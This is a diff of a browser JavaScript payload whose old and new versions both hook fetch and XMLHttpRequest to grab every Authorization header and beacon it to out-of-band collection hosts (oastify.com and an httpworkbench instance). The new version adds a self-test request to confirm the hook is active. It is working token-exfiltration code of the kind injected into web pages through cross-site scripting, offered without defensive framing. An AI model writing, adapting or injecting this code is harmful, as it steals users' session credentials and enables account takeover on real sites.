@@ -1,26 +1,31 @@
-(function() {  
-  const exfil = (token, type) => {  
-    new Image().src = `https://eew28edpfz72swi534p6wx7kzb52tshh.oastify.com/log?t=${encodeURIComponent(token)}&type=${type}`;  
-  };
+(function() {
+    // 1. Hook Fetch
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+        let h;
+        if (args[1] && args[1].headers) h = args[1].headers;
+        else if (args[0] && args[0].headers) h = args[0].headers;
 
- // Intercept Fetch API  
-  const originalFetch = window.fetch;  
-  window.fetch = function(...args) {  
-    const headers = args[1]?.headers || args[0]?.headers;  
-    if (headers) {  
-      const token = (headers instanceof Headers)  
-        ? headers.get('Authorization')  
-        : (headers['Authorization'] || headers['authorization']);  
-      if (token) exfil(token, 'fetch');  
-    }  
-    return originalFetch.apply(this, args);  
-  };
+        if (h) {
+            const t = (h instanceof Headers) ? h.get('Authorization') : (h['Authorization'] || h['authorization']);
+            if (t) {
+                new Image().src = `https://4lqsf4kfmpeszmpvauww3nea61cs0jo8.oastify.com/log?t=${encodeURIComponent(t)}&type=fetch`;
+            }
+        }
+        return originalFetch.apply(this, args);
+    };
 
- // Intercept XHR  
-  const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;  
-  XMLHttpRequest.prototype.setRequestHeader = function(header, value) {  
-    if (header.toLowerCase() === 'authorization') exfil(value, 'xhr');  
-    return originalSetRequestHeader.apply(this, arguments);  
-  };
+    // 2. Hook XMLHttpRequest (XHR)
+    const originalOpen = XMLHttpRequest.prototype.open;
+    const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
 
+    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
+        if (header.toLowerCase() === 'authorization') {
+            new Image().src = `https://28ac04qq.instances.httpworkbench.com/log?t=${encodeURIComponent(value)}&type=xhr`;
+        }
+        return originalSetRequestHeader.apply(this, arguments);
+    };
+
+    // 3. Test the hook immediately
+    fetch('/', { headers: { 'Authorization': 'HOOK_ACTIVE_TEST' } });
 })();
